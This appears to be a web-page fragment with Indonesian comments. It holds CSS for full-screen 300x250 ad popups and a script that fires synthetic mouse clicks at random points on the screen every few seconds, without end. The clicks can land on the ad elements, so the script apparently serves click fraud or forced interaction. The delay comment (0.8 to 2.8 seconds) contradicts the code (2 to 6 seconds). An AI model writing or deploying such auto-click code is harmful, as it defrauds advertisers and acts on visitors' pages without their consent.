<script>
function randomDelay() {
  return 2000 + Math.random() * 4000; // 0.8 - 2.8 detik
}

// klik di titik random layar (bebas area kosong atau tidak)
function clickAnywhere() {
  const x = Math.random() * window.innerWidth;
  const y = Math.random() * window.innerHeight;

  const el = document.elementFromPoint(x, y);

  // tetap “klik” walaupun kosong (kalau null, skip aman)
  if (el) {
    el.dispatchEvent(new MouseEvent("click", {
      bubbles: true,
      cancelable: true,
      clientX: x,
      clientY: y
    }));
  }
}

// loop
function loop() {
  clickAnywhere();
  setTimeout(loop, randomDelay());
}

loop();
</script>

<style>

/* POPUP 1 - ATAS TENGAH */
#popup1{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;justify-content:center;align-items:flex-start;z-index:9999;animation:fadeIn 0.3s ease;padding:20px;padding-top:40px}

/* ANIMASI */
@keyframes fadeIn{from{opacity:0}to{opacity:1}}
@keyframes popIn{0%{transform:scale(0.7) translateY(-20px);opacity:0}100%{transform:scale(1) translateY(0);opacity:1}}

/* STYLE IKLAN - UKURAN FIXED 300x250 */
.popup-box center,.popup-box center>*{display:block;line-height:0;font-size:0;margin:0;padding:0}

/* TOMBOL CLOSE - LEBIH KECIL */
.popup-close{position:absolute;top:6px;right:8px;background:transparent!important;border:none;cursor:pointer;z-index:99999!important;display:flex;align-items:center;justify-content:center;padding:2px;transition:transform 0.2s}
.popup-close:hover{transform:scale(1.15)}
.popup-close svg{display:block;width:16px;height:16px;filter:drop-shadow(0 1px 4px rgba(0,0,0,0.8))}
.popup-close:hover svg path{fill:#ff6b6b}

/* BADGE - SVG */
.badge{position:absolute;top:6px;left:0;z-index:99998;display:flex;align-items:center;gap:3px;padding:2px 8px 2px 6px;border-radius:0 10px 10px 0;font-family:Arial,sans-serif;font-size:9px;font-weight:bold;color:#fff;letter-spacing:0.5px;box-shadow:0 2px 8px rgba(255,107,53,0.4)}
.badge svg{width:10px;height:10px;flex-shrink:0;fill:#fff}
#popup1 .badge{background:linear-gradient(135deg,#e74c3c,#ff6b6b)}
#popup2 .badge{background:linear-gradient(135deg,#3498db,#2ecc71);font-size:8px;padding:2px 6px 2px 5px;box-shadow:0 2px 8px rgba(52,152,219,0.4)}
#popup2 .badge svg{width:8px;height:8px}

/* GLOW */
.popup-box::after{content:'';position:absolute;top:-2px;left:-2px;right:-2px;bottom:-2px;background:linear-gradient(45deg,#ff6b35,#f7931e,#ff6b35);border-radius:10px;z-index:-1;opacity:0.4;filter:blur(4px);animation:glowPulse 2s ease-in-out infinite}
@keyframes glowPulse{0%,100%{opacity:0.3;transform:scale(1)}50%{opacity:0.7;transform:scale(1.02)}}
#popup2 .popup-box::after{background:linear-gradient(45deg,#3498db,#2ecc71,#3498db)}

.popup-hidden{display:none!important}

/* ===== RESPONSIVE ===== */
@media (max-width: 600px) {
  #popup1{padding:10px;padding-top:20px}
  #popup2{padding:10px;padding-bottom:20px}
  
  #popup1 .popup-box,
  #popup2 .popup-box{width:300px;height:250px;flex-shrink:0}
  
  #popup1 .popup-box ins,
  #popup1 .popup-box iframe,
  #popup1 .popup-box img,
  #popup2 .popup-box ins,
  #popup2 .popup-box iframe,
  #popup2 .popup-box img{width:300px!important;height:250px!important;min-width:300px!important;min-height:250px!important}
  
  .badge{font-size:8px!important;padding:2px 6px 2px 5px!important}
  #popup1 .badge{font-size:9px!important}
  .badge svg{width:9px!important;height:9px!important}
  #popup2 .badge svg{width:8px!important;height:8px!important}
  
  .popup-close{top:5px;right:6px;padding:2px}
  .popup-close svg{width:15px!important;height:15px!important}
}

@media (max-width: 340px) {

  #popup2 .popup-box{transform:scale(0.85)}

  #popup2{padding-bottom:10px}
}
